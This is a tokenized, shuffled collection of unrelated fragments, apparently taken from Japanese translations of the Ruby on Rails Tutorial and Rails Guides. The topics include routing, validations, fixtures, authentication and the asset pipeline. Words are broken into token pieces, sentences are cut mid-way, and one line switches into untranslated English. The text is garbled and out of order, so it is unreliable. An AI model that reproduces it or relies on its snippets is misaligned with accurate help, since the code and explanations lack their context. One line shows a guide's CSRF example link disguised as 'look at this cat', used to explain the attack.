▁この場合 の \ k ode { initialize } メソッドは 、 以下のように \ k ode { attributes } という 引数 を 1 つ 取り ます 。
▁ 最 高 です ね ▟)
▁[ Create ] ▁ をクリックします 。
▁=> ▁[ 2, ▁3 , ▁4 , ▁5 , ▁6 , ▁7 , ▁ 8, ▁ 9 ]
▁ 認 証 機能 の 完成 に必要な のは 、 一 口 に 言 えば ログイン ステータス と ユーザー ID に基いて ページ へのアクセス を 制限 すること だけです 。
▁# ▁last _ name = ▁ インスタンス writer は 生成 されない
▁まずは 、 ユーザーを 保存 できるようにします ▟ 保存 に 成功 すると 、 ユーザー情報 は自動的に データベースに 登録 されます ▟ 次に ブラウザの 表示 を \ emph { リダイレクト } して 、 登録 された ユーザーの プロファイル を表示します ▟ つ い で に ウ ェ ル カ ム メッセージ も 表示 しましょう ▟ モックアップ を 図 \ ref { fig : signup _ success _ mockup } に示します 。
▁つまり 、 そのユーザー の id と リレーションシップ の id を使って DELETE リクエストを送信し 、 フォローしている 数 が 1 つ 減 る ことを確認します 。
▁my _ hash ▁= ▁ { ' first ' ▁=> ▁1, ▁' second ' ▁=> ▁' two ', ▁' th ir d ' ▁=> ▁[1, 2, 3 ]}
▁これらの ジョブ を より 細 か な 作業 単 位 に 分割 して 並 列 実行 することもできます 。
▁ 残念ながら 、 RVM と rb env は 共 存 できません ので 注意してください ▟ 著者 は 本書 で RVM を使い 続けて い るので 、 今回 も RVM を使用します 。
▁ ユーザー用の fixture ファイルに 2 人目のユーザー を追加 してみましょう ▁( リスト \ ref { code : fixture _ second _ user }) 。
▁ 並び順
▁Rails ▁[ GitHub リポジトリ ]( https :// github ▖ com / rails / rails ) ▁ を開いて 、 右 上 隅 にある ▁[ For k ] ▁ を 押 します 。
▁ 具体的には 、 たとえば ` Date ▖ new ( 1582 , ▁10 , ▁4 )▖ tomorrow ` を実行すると ` Date ▖ new ( 1582 , ▁10 , ▁ 15 ) ` が返されます 。
▁created _ at : ▁"2013-03-11 ▁00:57:46" , ▁updated _ at : ▁"2013-03-11 ▁00:57:46" > ,
▁# ▁=> ▁Mon , ▁29 ▁Mar ▁2010 ▁00:00:00 ▁+0000
▁ コミットメッセージ は \ emph { 現在 形 } かつ \ href { http :// en ▖ w ikipedia ▖ org / wiki / I mp er a tive _ m ood } { 命 令 形 } で 書く ようにしましょう ▁( 訳 注 : ▁これは 英語 で 書く 場合 の ルール です ▟ 日本語 であれば 「 〜 を追加 」 などの 体 言 止 め が よいでしょう ) 。
▁詳細については [ # 16 5 2 6 ]( https :// github ▖ com / rails / rails / pull / 16 5 2 6 ) を参照してください 。
▁この 設定 オプション に パス を追加する と 、 アセット の 検索 先 として 追加 されます 。
▁ 他 に 、 関数 の 戻り値 で使用する ことも よく あります 。
▁route ▁resources ▁: users
▁`: space r _ template ` オプションを使用することで 、 メ イン パーシャル のインスタンス と 交 互 に レンダリング される セ カ ンド パーシャル を指定することもできます 。
▁\ k ode { lib / assets } : ▁ あなた の開発 チーム によって 作成された ライブラリ 用の アセット
▁client ▁= ▁Client ▖ take
▁ この時点で 、 アプリケーションは 重要な 警 告 と 共 に メールアドレス の 一意性 を 強 制 し 、 テストスイート も パスするはずです 。
▁( 経験 上 、 こう しておく ことをお勧めします ) 。
▁まずは マイクロポスト 用の fixture に 、 別 々 の ユーザーに 紐 付け られた マイクロポストを 追加 していきます ▁( リスト \ ref { code : add _ micropost _ different _ owner }) 。
▁ { ▁ foo : ▁' bar ' ▁ }
▁作成した コードをリスト \ ref { code : new _ password _ reset } に示します
▁\ ref { sec : set ting _ the _ root _ route } で 最初の ルート は 設定 済み ですが 、 それ以外の ルート について も同様に 実装 していきます ▟ なお 、 login については 本章の 最 後で 少しだけ 実装します
▁class ▁My Validator ▁< ▁ ActiveModel :: Validator
▁これは 一般的 に 良い と される 慣習 で 、 たとえば 将来 、 JavaScript を使って 各 マイクロポストを 操作 した く な った とき な d に 役 立 ち ます 。
▁ ブラウザは Rails に対して リクエストを送信する 際に 、 特定の HTTP メソッド ▁( ` GET `、` POST `、` PATCH `、` PUT `、` DELETE ` など ) ▁ を使用して 、 URL に対する リクエスト を作成します 。
▁(\ k ode { mv } は Unix の コマンド です ▟ Windows で ファイル名 を変更する には 、 ファイル ブラウザから 行う か 、\ k ode { re name } コマンド を使って ください ) 。
▁{0} 図 1 ▖ 1 {/0} ▁{1} テキストエディタ / コマンドライン 開発環境 ▁( TextMate / ▁ IT ER M を使用 ) ▁\ href { http :// railstutorial ▖ org / images / figures / edit or _ s hell - full ▖ png }{( 拡大 ) }{/1}
▁@ msg ▁= ▁" N o ▁customer ▁found ▁for ▁this ▁order "
▁\ href { http :// ruby ▖ railstutorial ▖ org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails チュートリアル } } へ よう こ そ 。
▁Ruby において \ k ode { nil } は 特別な オブジェクト です ▟ Ruby の オブジェクト のうち 、 オブジェクト そのもの の 論理値 が false になる のは 、\ k ode { false } 自身 と nil の 2 つ \ emph { しか ありません } 。
▁new ビューを パーシャル 化 する
▁( こ の中で 重要な 変更 は S trong ▁Parameters だけ であり 、 それ以外の 変更 は さ ほど 重要 ではありません ) 。
▁ この時点で 、 アプリケーションコード は \ ref { sec : user _ micropost _ associations } のように なる のではないかと 予 測 した 方 も い る かもしれません ▟ 実際 似 ている のですが 、2 つの 大きな 違い があります 。
▁" Symbol " ▁=> ▁" symbol ",
▁ アセット キャッシュストア で 利用できる オプションは 、 アプリケーションの キャッシュストア と同じ です 。
▁ こうすることで 、 通常の ビューで の 出力結果 を 完全に 変 え ることができます 。
▁\ k ode { followed _ id } でも ユーザーを 特定 できる ことに 気 付き 、 フォローしているユーザー と フォロワー の 扱 い が 対 称 的 でない ことを よく 考え て み れば 、 もう ゲ ーム に 勝 った ような ものです 。
▁また 、 Rails の フォーム ヘルパー を使用して フォーム を生成し た場合 、 ある フィールド で バリデーション エラー が発生する と 、 その エントリ の 周 り に 追加 の ` < div >` が自動的に 生成されます 。
▁ 結果 として 、 次の \ k ode { if } 文 の 条件 式 が 評価 されます 。
▁* ▁` initialize _ logger `: ▁ ここ より 前の 位 置 で ` Rails ▖ logger ` を定義する イニシャライザ がない場合 、 アプリケーションの ロガー ( ` ActiveSupport :: Logger ` オブジェクト ) を 初期化 し 、` Rails ▖ logger ` にアクセス できるようにします 。
▁ New s Mailer ▖ week ly ( user )▖ deliver _ now
▁ メールアドレス の 一意性 を検証する ▁( ▁\ passing ▁ )
▁# ▁try メソッド を使用した 場合
▁上 で示した とおり 、 配列 の 要素 にアクセス するには 角 かっこ を使用します 。
▁ INNER ▁JOIN ▁ guest s ▁ ON ▁ guest s ▖ comment _ id ▁= ▁comments ▖ id
▁* ▁` integration _ to ol ` は 、 使用する 統合 ツール を定義します 。
▁ しかも 、 コードが 甚 だ しく 重複 しています 。
▁Ruby は 文字列 を扱う ための メソッドを 多数 持 っている
▁ 「 forgot ▁password 」 フォーム に 無効な メールアドレスを 入力 した 場合
▁* ▁SQL クエリ を 発行し 、 該当する 結果を データベースから 取り出し ます 。
▁@ customer ▖ destroy
▁# ▁Rack :: Bo un ce F a v icon を 一番 最後に 追加する
▁このメソッド の目的は ` K ernel # Array ` と似ています が 、 いくつかの 相 違 点 があります 。
▁`: child re n ` オプションを使用すると 、 これら を ノード 名 として 設定 できます 。
▁\ k ode { ▖ gitignore } ファイル ▁( 図 \ ref { fig : gitignore }) ▁ を ダ ブ ル クリック して 開 き 、 リスト \ ref { code : gitignore _ spring } のように 更新 します 。
▁ 例として 、 このメソッド を適用する オブジェクトの 構造 が 以下のように な っている とします 。
▁\ emph { ヒント : } ▁Web を検索し てみましょう ▟ この 目的 に う って つ け の 堅牢 な メソッドが 見つかる はずです ▟\ k ode { _ blank } という文字 も一緒に 検索 してみてください 。
▁リスト { p 0} の {2} create {/2} アクション の中で は 何も 行われ ません が 、 アクション を実行すると {2} new {/2} ビュー が 出力 される ので これで 十分です 。
▁| ▁GET ▁| ▁ / sekret / comments / : id / edit (▖ : format ) ▁| ▁comments # edit ▁| ▁edit _ comment _ path ▁|
▁ ページの 変更 の 結果を 図 \ ref { fig : user _ show _ sidebar _ css } に示します 。
▁Ruby では あらゆる もの が オブジェクト である ということは 既に 説明しました が 、 この節 では 実際に オブジェクト をいくつか 定義 してみましょう 。
▁` assert _ routing ` アサーション は 、 ルーティング を 2 つ の観点 ▁( 与えられた パス によって オプション が生成され ること 、 その オプション によって 元の パス が生成され ること ) ▁ から チェック します 。
▁ puts ▁<< - U S A G E ▖ strip _ her e doc
▁c attr _ accessor ▁: emulate _ boolean s
▁\ k ode { has _ secure _ password } メソッド を使う ことで 、 モデル に対して セキュア な パスワード を追加する ことができる
▁ここで 、 必要な \ k ode { DELETE } リクエストを 発行する リンク の 生成 は \ text tt { method : ▁: delete } 引数 によって 行われ ている点に注目してください ▟ ▁argument , ▁which ▁arrange s ▁for ▁the ▁link ▁to ▁issue ▁the ▁necessary ▁\ k ode { DELETE } ▁request ▖ ▁We ’ ve ▁also ▁wrap ped ▁each ▁link ▁inside ▁an ▁\ text tt { if } ▁statement ▁so ▁that ▁only ▁admin s ▁can ▁see ▁them ▖
▁@ order ▁= ▁@ customer ▖ orders ▖ create ( order _ date : ▁Time ▖ now )
▁scope ▁: published _ and _ comment ed , ▁-> ▁ { ▁ published ▖ where (" comments _ count ▁> ▁0 ") ▁ }
▁$ ▁p s ▁aux ▁| ▁ grep ▁ spring ╼ ▁ ubuntu ▁1 22 4 1 ▁0 ▖ 3 ▁ 0▖5 ▁ 58 99 60 ▁17 8 4 16 ▁?
▁Rails アプリケーション 内の ` JSON ▖ generate ` と ` JSON ▖ dump ` では とき た ま エラー が生じ ること があり ました 。
▁ --- ----------------
▁ 制 作 中の ブログ アプリケーションでは 、 これらの アクション が article に対する CRUD 操作を 担 当 します 。
▁これらの 検索 メソッドを使用することで 、 生の SQL を 書くこと なく 、 データベース への 特定の クエリ を実行する ための 引数 を渡すことができます 。
▁ここでは テンプレート の フォーマット は HTML で なければ な らず 、 ハンドラ ー は ` erb `、` builder `、` coffee ` のいずれか でない と いけない という ことになります 。
▁ アカウントを有効化する 段 取り は 、 ユーザーログイン ▁(\ ref { sec : logging _ in }) 、 特に ユーザーの 記 憶 ▁(\ ref { sec : remember _ me }) ▁ と似ています 。
▁ 簡単な アプリケーション であれば 、 この 最初の 実装 だけで ほとんどの 目的 を 達 成 できる でしょう 。
▁ 条件 文字列 の中に 変数 を直接 置く と 、 その 変数 は データベースに ▁** そのまま ** ▁ 渡 されてしまいます 。
▁2 ▁files ▁changed , ▁5 ▁insert ion s ( + ), ▁24 3 ▁deletion s ( - )
▁上の ファイルは 以下のように 参 照 されます 。
▁ タイトル が 付 いた Home ページ
▁この節では 、 いよいよ \ href { http :// www ▖ dictionary ▖ com / b row se / p en ultimate } { 最 後 から 2 番目の } ユーザー アクション である \ k ode { index } アクション を追加しましょう ▟ この アクションは 、\ emph { すべての } ユーザーを 一覧 表示 します 。
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁photos # show ▁| ▁ 特定の 写 真 を表示する ▁|
▁ メールアドレスを ユーザー名 にした ことで 、 ユーザー 同士 で 通 信 できるように 拡張 できる 可能性 が 開 か れ ます ▁({0}{1} 第 10 章 {/1}{/0} ) 。
▁ アセットパイプライン は development モード で ランタイム 時の エラーを デフォルトで チェック します 。
▁ここでは 話 を簡単に する ため 、 アプリケーションが ユーザー を表す ために 持つ クラスは ` User ` で あるとします ▁( この後 で もっと カスタマイズ し や す く します ) 。
▁t ▖ text ▁: text
▁self を省略した 結果を リスト \ ref { code : new _ session _ tests } に示します 。
▁adapter : ▁ postgresql
▁* ▁` create !
▁ サンプルアプリケーションの Home ページに デバッグ情報 を表示する
▁ モデル 側 での 処理 が完了し 、 ユーザーに 結果を 表示する 時 が き たら 、 コントローラは 処理 結果を ビュー に 渡します 。
▁< script ▁src ="/ assets / projects ▖ js ?
▁ 上に 加 え 、 以下の 様 な CoffeeScript を作成します 。
▁[] ▖ from (0) ▁# ▁=> ▁[]
▁Web アプリケーションを 作る 際 、 アプリケーション で使用される 構造 を表す ための \ emph { データモデル } を 最初に 作成 しておく のが普通です 。
▁ 表 \ ref { table : shortcuts } に示したように 、 実は \ k ode { install } を省略 できます ▟\ k ode { bundle } コマンド それ 自体 が \ k ode { bundle ▁install } の エイリアス である ためです 。
▁ })
▁@ part ▖ assemblies ▁<< ▁@ assembly 1
▁` [ ] = ` セッター を使用して 同じ ことを 行えます 。
▁* ▁`: re strict _ with _ error ` を指定すると 、 関連付けられたオブジェクト がある場合 に エラー が オーナー に追加されます 。
▁\ href { https :// p ragmatic s tudio ▖ com / ref s / railstutorial } { P ragmatic ▁S tudio } : ▁M i k e ▁Clark と N ic o le ▁Clark が 教 鞭 を 執 っている オンライン の Rails クラス です 。
▁第 \ ref { cha : static _ pages } 章 で示した とおり 、\ k ode { home } ▁ アクションは Web ページ を表示する ための もの であり 、 値 を返す ための もの ではありません でした 。
▁これ より 、 レイアウト の詳細 と 利用 法 について 本ガイド で説明します 。
▁* ▁ 旧 来 の find er が 配列 を返し ていた の に対し 、` where (▖▖▖) ` は リレーション を返します 。
▁{0} 図 11 ▖ 1 {/0} ▁{1} Micropost データモデル {/1}
▁ 保存 と リダイレクト を行う 、 user の \ k ode { create } アクション
▁Micropost マイグレーション
▁たとえば 、\ k ode { 引数 } を 1 つ 取り 、 引数 が 空 かどうか に 基 づ いた メッセージ を返す \ emph { string \_ message } という 関数 を定義し てみましょう 。
▁- 1 34 ▖ ordinal ▁# ▁=> ▁" th "
▁ここで 面 白 い のは 、 `@ article ` のような インスタンス変数 の代わりに 同じ 名前 の シンボル ▁( `: article ` など ) ▁ を 渡 した 場合にも 動作 は まったく 同じ であること です 。
▁### ▁ ヘルパー の 読み込み 順序
▁\ text tt { f ound _ user } という 変数 が作成され 、 その 値は \ text tt { find _ by } の 返 し 値 に 等 しく なります 。
▁ Writ ing ▁new ▁ Guardfile ▁to ▁ / Users / mhartl / rails _ projects / sample _ app / Guardfile
▁ この動作 は 決 して 意図 された もの ではありません 。
▁WARNING : ▁ イニシャライザ が 起動 される 順序 は 、 論 理 的に 矛盾 が生じ ない限り において 、 before や after を使用して い か なる 順序 に 変更 することもできます 。
▁( このコード は \ emph { スコープ } に関する 最初の 例 で もあります 。
▁x ▁= ▁x ▁+ ▁1 ▁-> ▁x ▁ += ▁1 ╼ ▁x ▁= ▁x ▁* ▁3 ▁-> ▁x ▁* = ▁3 ╼ ▁x ▁= ▁x ▁- ▁ 8 ▁-> ▁x ▁- = ▁ 8 ╼ ▁x ▁= ▁x ▁ / ▁2 ▁-> ▁x ▁ / = ▁2 ╼ ▁@ foo ▁= ▁@ foo ▁|| ▁" bar " ▁-> ▁@ foo ▁ ||= ▁" bar "
▁ / users /1
▁これは Rails 自身 のための 設定 です 。
▁remember _ token
▁\ emph { Ruby ▁on ▁Rails チュートリアル } で Web 開発 を学ぶ うえで どんな 基 礎 知識 が 必要な のか ▁( = どの ぐらい 素 人 でも 大丈夫 な のか ) ▁という 質 問 を よく い ただ きます 。
▁> > ▁Person ▖ create ▖ errors [: name ] ▖ any ?
▁* ▁his または her ▁-> ▁their に置き換える
▁[ ` button _ to ` ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / Url Helper ▖ html # method - i - button _ to ) は ボタン 作成 を 支 援 する ヘルパー です 。
▁上のコード には 、 以下のような 奇 妙 な 構 文 が含まれています 。
▁< td > <%= ▁c ▁%></ td >
▁=> ▁"2013-03-11 ▁00:57:46"
▁" About "
▁Home ページに フォロワー の 統 計 情報 を追加する
▁#### ▁` belongs _ to ` で 追加される メソッド
▁もちろん 、 パーシャル が動作する ためには 、 それに対応する ファイル と コンテンツ を記述し なければなりません 。
▁<%= ▁form _ for ▁@ user ▁do ▁| f | ▁%>
▁ レイアウト 宣言 は 下 の 階層 に 継 承 されます ▟ 下 の 階層 、 つまり より 具体的な レイアウト 宣言 は 、 上の 階層 、 つまり より 一般的な レイアウト よりも 常に 優 先 されます 。
▁=> ▁#< User : 0 x 22 51 67 c ▁@ email =" mhartl @ example ▖ com ", ╼ @ name =" Michael ▁Hartl ">
▁ データ モデリング と マイクロポスト 表示 テンプレート の両方 が 完成 した ので 、 次は Web 経由で それら を作成するための インターフェイス に取りかかりま しょう 。
▁ ナビゲーション パ ネ ル の 右 上の にある 歯車 アイコン をクリックします ▁( 図 \ ref { fig : file _ navigator _ ge ar _ icon }) 。
▁commit ▁d f 0 a 6 2 f 3 f 0 9 1 e 53 f fa 7 99 30 9 b 3 e 32 c 27 b 0 b 38 e b 4
▁`: : Math :: P I ` のような 絶 対 定数名 を指定すると ` NameError ` が発生し ます 。
▁` app / assets / stylesheets / main ▖ css ` と ` app / assets / stylesheets / photos / columns ▖ css ` を含め る には 以下のように します 。
▁ CRUD とは 、 4 つの データベース 操作 を表す ▁** C ** ▁re ate 、 ▁** R ** ▁e ad 、 ▁** U ** ▁p date 、 ▁** D ** ▁e let e の 頭 字 語 です 。
▁リスト \ ref { code : pages _ routes } のとき と 同じ要領で 変更を 行った 結果を リスト \ ref { code : about _ route } に示します 。
▁ このような 場合は 、 新しい プルリクエスト を作成する 代わりに 、 コミット の ス カ ッ シ ュ について 既に 説明 した 方法 を使用して 、 自分の ブランチ を GitHub に 強制的に プッシュ することもできます 。
▁S e ar ch ed ▁in : ▁* ▁"/ path / to / blog / app / views "
▁ 式 の実行 結果は 式 に 続けて 書き 、 冒 頭 に ▁" # ▁=> ▁" ▁ を追加して 縦 を 揃 え ること 。
▁ シンボル \ k ode { : user } が \ k ode { factory } コマンド に渡され ると 、 Factory ▁Girl は それ に 続 く 定義 が User モデルオブジェクト を 対象 と している ことを 認 識 します 。
▁( この後 、 上の 式 に ひとつ 論理値 を追加します 。
▁<%= ▁f ▖ submit ▁%>
▁ フィールド 名 は 文字列 形式 に することもできます 。
▁* ▁` ActionDispatch :: Callbacks ▖ before ` には 、 リクエスト より 前に 実行 したい コード ブロック を 1 つ 引数として 与 えます 。
▁この 2 つの ファイルは Bundler ▁gem で 使用されます 。
▁ 以前の Rails では 、 インライン コールバック ブロック で 以下のように ` return ` を使用すること が 許 容 され ていました 。
▁Git は 本書 で 多 用 されているので 、 早い 内に インストール を 済 ま せ ておきます ▟\ href { http :// www ▖ git - s cm ▖ com / book / en / Getting - S t ar ted - Installing - Git }{\ emph { Pro ▁Git } の 「 Git のインストール 」 } で プラットフォーム 毎 の 解説 を行って い るので 参考にしてください 。
▁` scope ` メソッドを使用することで 、` resource ` によって 生成される デフォルトの パス 名 を変更 できます 。
▁\ emph { Rails チュートリアル } では Rails アプリケーションの テスティング も 扱 っている ので 、 コード で どんな ことを すると テストスイート が 失敗 ▁( 赤色 で 表示 ) し 、 どう すると テストスイート が パス ▁( 緑色 で 表示 ) ▁ するか を 実 地 で 学 べ る ようになっています 。
▁続いて 、 Help ページ と About ページ も同様に 変更します ▁( リスト \ ref { code : help _ view _ erb _ title } 、 リスト \ ref { code : about _ view _ erb _ title }) 。
▁\ k ode { edit } と \ k ode { update } アクション の 保 護 に対するテスト する
▁( これを行うには リスト \ ref { code : authenticated _ p } の \ k ode { authenticated ?} メソッドを 改良 する必要があります ) 。
▁ 各 ステップ で 理解 する 必要のある コードの 量 は わずか ですが 、 こうした 理解 を 積 み 重 ね て い く ことで 、 最終的に Rails の 知識 を 高い レベルで 身につけ られる ように 構成 されています ▟ このように して 得 た 深 い 知識 は 柔 軟 性 が 高 く 、 どのような Web アプリ を作成する 時に も 応用 が 効 きます 。
▁Active ▁Job と ` # deliver _ later ` メソッド の導入に伴い 、 この動作 が変更され ました 。
▁* = ▁require _ self
▁Rails ▖ application ▖ config ▖ assets ▖ precompile ▁ += ▁[ ' admin ▖ js ', ▁' admin ▖ css ', ▁' s w f Object ▖ js ']
▁リスト \ ref { code : bitbucket _ add _ push } のように 表示され ない場合は 、 公開鍵 が正しく 追加 されていない 可能性があります ので 、 公開鍵 の 追加 を や り 直 す ことをおすすめします 。
▁\ k ode { setup } メソッド の中で コメント している とおり 、 マイクロポスト を作成する コードは 動 きます が 、 慣習 的に は 正しく ありません ▁(\ ref { sec : user _ micropost _ associations } で 修正 します ) 。
▁ ファイルが マニフェスト や ヘルパー から 参 照 される 場合 、 Sprockets は デフォルトの アセット の 置き場所 である 3 つの ディレクトリ から ファイル を探し ます 。
▁* ▁ 一括読み込み ▁( eager ▁loading ) ▁ を使用して 、 データ 取り出し に必要な クエリ の実行 回 数を 減 ら す
▁ データベース の観点 では 、2 つの クラスは 中 間 で 結合テーブル を 介 して 関連付け られます ▟ この 結合テーブル には 、 両方 の クラス を指す 外部キー が それぞれ 含 まれ ます 。
▁Rails コンソール を 起動 し 、 example _ user の コードを \ k ode { require } して 、 自 作 した クラスを 試 し に 使って みましょう 。
▁Load ing ▁test ▁environment
▁この レスポンス を curl コマンド を使用して 調 べ てみると 以下の ようになっています 。
▁( ただし 、\ ref { sec : guard } で説明した Guard を使っている 場合は 、 再起動 させる だけで は うまく 動かない かもしれません ▟ その 場合は ターミナル から 一 旦 抜 け て 、 新しい ターミナル で Guard を再 実行 してみてください ▟)
▁* ▁ マ ス ター を clone して テストスイート を実行する 方法
▁</ nav >
▁ このため 、 有効な CSS ファイルは 、 すべて SCSS ファイル としても 扱 う ことができ 、 既存の 記 法 ルール を使用している プロジェクト にとって も 互換性 のある 便利な フォーマット になっています 。
▁ 記憶トークン をテストするために 、 最初に テスト ユーザーを 保存 し ▁( これまで は 作成 されて も 保存 は されていません でした ) 、 次に ユーザーの \ k ode { remember _ token } 属性 が 空欄 でない ことを確認します 。
▁ 一 方 、「 パスワード の ハッシュ化 」 では \ emph { 元に戻 せ ない ▁( 不可 逆 )} ▁という 点が 重要 になります ▟ したがって 、 ▁ 「 計算 量 的に 元の パスワードを 復 元 するのは 困難 である 」 という 点を 強 調 するために 、 暗号化 ではなく ハッシュ化 という 用 語 を使っています 。
▁$ ▁bin / rails ▁g ▁controller ▁comments
▁create ▁app / views / user _ mailer
▁最初の 部分 では 、 どの テンプレート が 見当たらない か が示されています 。
▁before _ action ▁: set _ expert _ locale
▁# ▁ パスワード再設定の 期 限 が 切 れ ている 場合は true を返す
▁ 自分 も 何か issue に 貢献 できる 方法は ある でしょうか 。
▁これは \ emph { Ajax } を使用することで 解決 できます ▟ Ajax を使用すれば 、 Web ページ から サーバー に 「 非同期 」 で 、 ページを 移動 すること なく リクエストを送信する ことができます
▁* ▁` proxy _ association ▖ reflection ` は 、 関連付けを 記 述 する リ フ レ ク ション オブジェクトを返します 。
▁* ▁flash 機能 を提供します ( flash とは 連続 する リクエスト 間 で 値を 共有 する 機能 です ) 。
▁class ▁S end We e k ly S um m ary
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁id : ▁ / [ A - Z ] \ d { 5 } /
▁### ▁Create
▁` A S C ` ( 昇 順 ) や ` D E S C ` ( 降 順 ) を指定することもできます 。
▁ 新しい gem が正しく 読み込まれる ように 、 Web サーバーを再起動 してください 。
▁"2013-03- 06 ▁02:37:37" , ▁updated _ at : ▁"2013-03- 06 ▁02:37:37" > , ▁#< Micropost ▁id : ▁2,
▁* ▁ body が 文字列 のみ の レスポンス に対して 、 ETag ヘッダ を追加します ▟
▁# ▁it ▁is ▁equivalent ▁to ▁< tt > collection ▖ size ▖ zero ? </ tt > ▖ ▁if ▁the ▁( < tt > collection ▖ size ▖ zero ? </ tt > と 同 値 )
▁* ▁` config ▖ active _ record ▖ main tain _ test _ schema ` は 、 テスト 実行時に Active ▁Record が テスト 用 データベース スキーマ を ` db / schema ▖ rb ` ( または ` db / structure ▖ sql ` ) に基いて 最新の 状態 にする かどうかを指定します 。
▁<% ▁end ▁%>
▁ 実は 、 Ruby は 改行 と 空白 を 区別 していません
▁ユーザーの 削除 は どの ユーザーに も 許可 できる もの では ないので 、 管理ユーザー という 特 権 クラス を作成し 、 この ユーザーに のみ 削除 を 許可 する ようにします 。
▁` ActiveRecord :: Connection Adapters :: Abstract A d a p ter ` から 別の 例として 以下 をご紹介します ▟ ここでは `@ logger ` が ` nil ` になる ことがあります 。
▁Ruby ▁on ▁Rails ▁Tutorial ▁ Sample ▁App ▁|
▁ 空 行 に 余分な スペース を 置 か ないこと 。
▁ CRUD : ▁ データ の 読み 書き
▁* ▁` association = ( associate ) `
▁ 親 オブジェクトが保存される と 、 関連付け ら れ ていた オブジェクト のうち 保存 されて い なかった メンバ はすべて 保存されます 。
▁ ユーザー一覧ページ で pagination を使う
▁Person ▖ create ( name : ▁" John ▁Doe ")▖ valid ?
▁* ▁ アンダースコア が 他にも ある 場合は スペース に置き換え ます 。
▁{0} 図 7 ▖ 1 3 {/0} {1} \ k ode { text } フィールド と \ k ode { password } フィールド に 文字 を 入力 した 状態 ▟\ href { http :// railstutorial ▖ org / images / figures / filled _ in _ form _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁Rails では 、 オブジェクト から XML 形式 への 変換 と 、 変換 された XML を ブラウザに送信 する 機能 が ビルトイン で サポート されています 。
▁* ▁` since ` や ` ago ` の 移動 先 の 時間 が ` Time ` で 表現 できない 場合 、` DateTime ` オブジェクトが 代わりに 返 されます 。
▁=> ▁[" A ", ▁" B ", ▁" C "]
▁リスト \ ref { code : micropost _ instance _ variable } のとき
▁この ルーティング は 、\ k ode { / help } ▁(\ text tt { GET } リクエスト に応答する ) ▁ で 有効な ページ と 、 その ページ へのパス を返す \ k ode { help _ path } という名前の 名前付きルート の両方 を 準備 します
▁HTML ソース の 中の 、 フォーム を 形 成 する HTML 構造 に注目し てみましょう 。
▁Microposts リソース の 追加 によって 、 サンプルアプリケーション は ほぼ 完成 に 近 づ きました 。
▁ 次は マイクロポスト作成フォーム を定義します ▁( リスト \ ref { code : micropost _ form })▟ これは ユーザー登録フォーム に 似 ています ▁( リスト \ ref { code : signup _ form }) 。
▁hash ▁# ▁=> ▁ { : b =>2}
▁ コード 生成 、 コンソール の 起動 、 ローカル の Web サーバ の 立 ち 上 げ など に使用する Rails スクリプト
▁self ▖ include _ root _ in _ json ▁= ▁false
▁layout ▁" special "
▁この 機能 が 必要な コントローラ では ` ActionView :: Record I d ent if i er ` モジュール を インクルード する必要があります 。
▁\ k ode { full _ title } ヘルパー のテスト 。
▁| ▁test / controllers / comments _ controller _ test ▖ rb ▁| ▁ コントローラの テスト 用 ファイル ▁|
▁ ビュー そのもの は 1 ページ のコード ですが 、 アプリケーションの データベースから 取り出し た 情報 を使用して 各 プロファイル の表示 を カスタマイズ します 。
▁リスト \ ref { code : user _ signup _ with _ account _ activation } では 、 登録 時の リダイレクト の 挙 動 が変更され ている 点にご注意ください 。
▁Home ページ と Pro file ページ にある 統 計 情報 のテスト を書いて み てください 。
▁destroy
▁# ▁< foo ▁type =" integer "> 1 </ foo >
▁そこで 、 管理者 であれば ユーザー 一覧 画面 に 削除リンク が表示される 仕 様 を利用して 、 リスト \ ref { code : user _ index _ test } のテスト に 今回の テスト を追加して い く ことにします ▟ これにより 、 後 ほど 追加する 管理者 の 振る舞い についても 簡単に テストが 書 け そう です 。
▁(\ k ode { private } キーワード の詳細については ▁\ ref { sec : remember _ me } で説明します ) 。
▁ これはリスト \ ref { code : user _ edit _ view } で使用されていました 。
▁* ▁`: in ` ▁ または ▁`: with in ` ▁- ▁ 属性 の長さ は 、 与えられた 区 間 以 内で なければなりません 。
▁ いつものように 、 以下を実行して テストスイート が 緑色 ▁( 成功 ) ▁になることを確認 してから先に進 みましょう 。
▁ フォーム ヘルパーは 、 モデル 属性 の 操作 に 特 化 した もの と 、 より 一般的な もの の 2 種類 に 分 類 できます 。
▁#### ▁` split ( value ▁= ▁nil ) `
▁< a ▁ href =' http :// example ▖ com / articles /1/ destroy ' > lo o k ▁at ▁this ▁ cat !
▁ テストが 失敗する 理由は 、\ ref { sec : a _ hashed _ password } で 触れ た ように \ k ode { has \_ secure \_ password } には 、 仮 想 的な \ k ode { password } 属性 と \ k ode { password \_ confirmation } 属性 に対して バリデーション を する 機能 も ( 強制的に ) 追加 されている からです ▟ しかし リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } の テストでは 、\ k ode {@ user } ▁ 変数 に このような 値が セット されており ません 。
▁< p > こんにちは 、 以下の 写 真 です ▟ </ p >
▁ モデルの 自動生成 についても 、 同様の方法で 元に戻す ことができます 。
▁CDN を使用して い ない場合 、 ブラウザは この ヘッダ 情報 を使用して コンテンツ を キャッシュ します 。
▁@ order ▁= ▁@ customer ▖ orders ▖ create ( order _ date : ▁Time ▖ now ,
▁\ ref { sec : unsuccessful _ signup s } では 、 ユーザーが 制 約 に 違 反 したときに 、 検証 機能 によって自動的に 表示される 有 用 な エラーメッセージ をお見せします 。
▁ 永 続 ユーザー ID を含む cookies を 受け取った ら 、 その ID で データベース を検索し 、 記憶トークン の cookies が データベース 内の ハッシュ 値 と 一致する ことを確認する 。
▁このヘルパーは 、`: only _ integer ` 以外に も 以下の オプション を使用して 制限 を指定できます 。
▁ ルーティング に コレクション ▁( collection ) ▁ を追加する には 以下のように します 。
▁ フォーム そのもの は リスト \ ref { code : signup _ form } で 示 します 。
▁デフォルトでは 、` nil `、` false `、` true ` 、 シンボル 、 数値 、 クラス 、 モジュール 、 メソッド オブジェクトを 除 く すべての オブジェクトが ` duplicable ?` ▁# => ▁true です 。
▁If ▁` return ` ▁is ▁needed ▁it ▁is ▁recommended ▁to ▁explicitly ▁define ▁a ▁method ▖
▁` app / views / user _ mailer / ` ディレクトリ で ` welcome _ email ▖ html ▖ erb ` という ファイルを 1 つ 作成 してください 。
▁ 新しい Micropost の 有効 性 に対するテスト
▁ 小文字 で始まる 文字列 も 扱 えます 。
